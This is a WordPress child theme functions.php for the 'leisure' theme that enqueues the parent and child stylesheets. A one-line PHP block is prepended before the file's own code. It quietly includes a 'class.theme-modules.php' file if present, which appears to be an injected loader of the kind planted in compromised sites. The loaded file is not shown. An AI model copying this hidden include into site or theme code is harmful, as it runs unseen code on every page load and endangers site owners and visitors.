<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

add_action( 'wp_enqueue_scripts', 'leisure_child_enqueue_front' );

function leisure_child_enqueue_front(){
  wp_enqueue_style( 'leisure-style-parent', get_template_directory_uri() .'/style.css' );
  wp_enqueue_style( 'leisure-style' );
}

?>
